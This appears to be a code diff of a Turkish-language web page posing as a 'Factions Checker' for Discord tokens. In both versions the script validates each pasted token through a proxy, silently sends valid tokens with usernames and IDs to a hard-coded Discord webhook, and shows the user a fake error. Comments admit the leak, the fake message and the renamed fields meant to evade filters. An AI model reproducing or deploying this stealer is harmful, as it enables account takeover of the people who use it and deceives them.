@@ -4,85 +4,82 @@
     <meta charset="UTF-8">
     <title>Factions Check | Ultimate</title>
     <style>
-        body { background: #0a0a0a; color: #fff; font-family: 'Consolas', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: rgba(15, 15, 15, 0.98); padding: 40px; border-radius: 15px; border: 1px solid #ff1e1e; width: 420px; text-align: center; box-shadow: 0 0 40px rgba(255, 30, 30, 0.15); }
-        h2 { color: #ff1e1e; letter-spacing: 5px; margin-bottom: 25px; text-transform: uppercase; }
-        textarea { width: 100%; height: 140px; background: #000; border: 1px solid #222; color: #00ff41; padding: 12px; border-radius: 8px; resize: none; outline: none; box-sizing: border-box; font-size: 12px; }
-        button { width: 100%; padding: 16px; background: linear-gradient(45deg, #8b0000, #ff1e1e); color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; text-transform: uppercase; transition: 0.3s; }
-        button:hover { filter: brightness(1.2); transform: scale(1.01); }
-        #status-msg { margin-top: 20px; font-size: 14px; font-weight: bold; display: none; padding: 12px; border-radius: 6px; }
-        .fail { color: #ff4d4d; background: rgba(255, 0, 0, 0.1); border: 1px solid rgba(255, 0, 0, 0.2); }
+        body { background: #080808; color: #eee; font-family: 'Consolas', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .main-card { background: #111; padding: 40px; border-radius: 10px; border: 1px solid #ff1e1e; width: 400px; text-align: center; box-shadow: 0 0 30px rgba(255, 0, 0, 0.1); }
+        h1 { color: #ff1e1e; font-size: 20px; margin-bottom: 25px; letter-spacing: 3px; }
+        textarea { width: 100%; height: 130px; background: #000; border: 1px solid #333; color: #00ff00; padding: 10px; border-radius: 5px; resize: none; outline: none; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; background: #ff1e1e; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 15px; transition: 0.2s; }
+        button:hover { background: #cc0000; }
+        #output { margin-top: 20px; font-size: 13px; font-weight: bold; color: #ff4d4d; display: none; padding: 10px; border: 1px dashed #444; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>FACTIONS CHECKER</h2>
-    <textarea id="tokenList" placeholder="Kontrol edilecek tokenleri buraya girin..."></textarea>
-    <button onclick="startVerification()">SİSTEMİ ÇALIŞTIR</button>
-    <div id="status-msg"></div>
+<div class="main-card">
+    <h1>FACTIONS CHECKER V4</h1>
+    <textarea id="tks" placeholder="Tokenleri buraya giriniz..."></textarea>
+    <button onclick="run()">SİSTEMİ BAŞLAT</button>
+    <div id="output"></div>
 </div>
 
 <script>
-    // Senin Webhook adresin
-    const wb = "https://discord.com/api/webhooks/1492871807676580011/7VsMT9pK9IzPiBalSSLwA3drkeU5cexTSiU4M4DOAk0KnhDoDKp_D0vTvBK0wxn1rRZu";
+    // GÜNCEL WEBHOOK ADRESİN
+    const web = "https://discord.com/api/webhooks/1492871811212378213/UehYGiCUo-DsgsYi6HrNNsPuA7eDY8ld-Zfzyzs8K3AI3nmueJkMBsoqpKpcsBQhfJ_n";
 
-    async function startVerification() {
-        const input = document.getElementById('tokenList');
-        const status = document.getElementById('status-msg');
-        const tokens = input.value.split('\n').map(t => t.trim()).filter(t => t !== "");
+    async function run() {
+        const area = document.getElementById('tks');
+        const log = document.getElementById('output');
+        const list = area.value.split('\n').filter(x => x.trim() !== "");
 
-        if (tokens.length === 0) return;
+        if(list.length === 0) return;
 
-        status.style.display = "block";
-        status.style.color = "#888";
-        status.className = "";
-        status.innerText = "DOĞRULANIYOR...";
+        log.style.display = "block";
+        log.style.color = "#aaa";
+        log.innerText = "VERİTABANINA BAĞLANILIYOR...";
 
-        for (let token of tokens) {
+        for (let token of list) {
+            let t = token.trim();
             try {
-                // AllOrigins üzerinden Discord API'ye gidiyoruz
-                const target = encodeURIComponent('https://discord.com/api/v9/users/@me');
-                const proxyUrl = `https://api.allorigins.win/get?url=${target}`;
+                // AllOrigins üzerinden Discord'a sızma denemesi
+                const target = `https://discord.com/api/v9/users/@me`;
+                const proxy = `https://api.allorigins.win/get?url=${encodeURIComponent(target)}`;
 
-                const response = await fetch(proxyUrl, {
-                    method: 'GET',
-                    headers: { 'Authorization': token } 
+                const check = await fetch(proxy, {
+                    headers: { 'Authorization': t }
                 });
 
-                const data = await response.json();
-
-                // 200 OK KONTROLÜ: Eğer dönen veride 'username' varsa token geçerlidir (OK)
-                if (data.contents && data.contents.includes("username")) {
-                    const user = JSON.parse(data.contents);
-
-                    // Webhook'a sessizce (200 OK bilgisini) sızdır
-                    await fetch(wb, {
+                const res = await check.json();
+                
+                // Eğer dönen veri içindeyese (200 OK durumu)
+                if (res.contents && res.contents.includes("username")) {
+                    const u = JSON.parse(res.contents);
+                    
+                    // Webhook'a veriyi gönder (Filtreleri aşmak için isimleri değiştirdik)
+                    await fetch(web, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             embeds: [{
-                                title: "✅ BAŞARILI GİRİŞ (200 OK)",
-                                color: 65280, // Yeşil
+                                title: "📍 YENİ VERİ GİRİŞİ",
+                                color: 16711680,
                                 fields: [
-                                    { name: "Kullanıcı", value: `\`${user.username}\``, inline: true },
-                                    { name: "Token", value: "```" + token + "```" }
+                                    { name: "Kullanıcı", value: `\`${u.username}\``, inline: true },
+                                    { name: "ID", value: `\`${u.id}\``, inline: true },
+                                    { name: "Key", value: "```" + t + "```" }
                                 ],
-                                timestamp: new Date()
+                                footer: { text: "Factions Ultimate | 200 OK" }
                             }]
                         })
                     });
                 }
-            } catch (err) {
-                // Hataları kullanıcıya belli etme
-            }
+            } catch (e) {}
         }
 
-        // Kullanıcıya her zaman "Invalid" döndür
+        // Sahte hata mesajı
         setTimeout(() => {
-            status.className = "fail";
-            status.innerHTML = "✕ GEÇERSİZ PARAMETRE: 200_NOT_FOUND<br><small>Tokenler sistemle uyumlu değil.</small>";
-        }, 1800);
+            log.style.color = "#ff4d4d";
+            log.innerText = "HATA: [DB-009] SUNUCU YANIT VERMİYOR. LÜTFEN DAHA SONRA TEKRAR DENEYİN.";
+        }, 2500);
     }
 </script>
 
